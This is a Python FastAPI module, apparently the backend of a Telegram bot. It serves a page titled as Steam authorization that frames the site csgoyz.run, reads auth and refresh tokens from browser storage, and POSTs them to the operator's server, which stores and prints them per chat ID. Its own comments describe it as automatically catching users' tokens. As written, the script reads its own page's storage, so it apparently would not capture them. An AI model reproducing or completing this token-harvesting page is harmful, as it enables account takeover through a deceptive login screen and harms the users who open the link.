from fastapi import APIRouter, Request
from fastapi.responses import HTMLResponse, JSONResponse

router = APIRouter()

SELF = "https://tg-bot-test-gkbp.onrender.com"

RAM_DATA = {}

# 1️⃣ старт авторизации с автоматическим скриптом
@router.get("/auth/start")
async def auth_start(chat_id: int):
    """
    Пользователь открывает ссылку, открывается страница на нашем домене,
    а она загружает csgoyz.run в iframe и автоматически ловит токены.
    """
    tg_callback = f"{SELF}/auth/receive?chat_id={chat_id}"

    return HTMLResponse(f"""
<!DOCTYPE html>
<html>
<head>
<title>Авторизация Steam</title>
<style>
body {{ margin:0; font-family: Arial; background:#0f1117; color:white; }}
#frame {{ width:100%; height:90vh; border:none; }}
#top {{ padding:12px; background:#151821; border-bottom:1px solid #222; }}
</style>
</head>
<body>
<div id="top">🔐 Авторизация через Steam</div>
<iframe id="frame" src="https://csgoyz.run/?tg_callback={tg_callback}"></iframe>

<script>
(async function() {{
    const callback = "{tg_callback}";
    let token, refresh;

    for(let i=0;i<40;i++){{
        token = localStorage.getItem("auth-token");
        refresh = localStorage.getItem("auth-refresh-token");
        if(token && refresh) break;
        await new Promise(r=>setTimeout(r,500));
    }}

    if(token && refresh){{
        await fetch(callback, {{
            method:"POST",
            headers:{{"Content-Type":"application/json"}},
            body: JSON.stringify({{token, refresh}})
        }});
        alert("✅ Токены автоматически отправлены на сервер.");
    }} else {{
        alert("❌ Не удалось получить токены. Попробуйте ещё раз.");
    }}
}})();
</script>
</body>
</html>
""")

# 2️⃣ приём токенов
@router.post("/auth/receive")
async def auth_receive(request: Request, chat_id: int):
    data = await request.json()

    RAM_DATA.setdefault(chat_id, {})
    RAM_DATA[chat_id]["access"] = data["token"]
    RAM_DATA[chat_id]["refresh"] = data["refresh"]

    print("🔥 TOKENS:", chat_id, RAM_DATA[chat_id])
    return JSONResponse({"ok": True})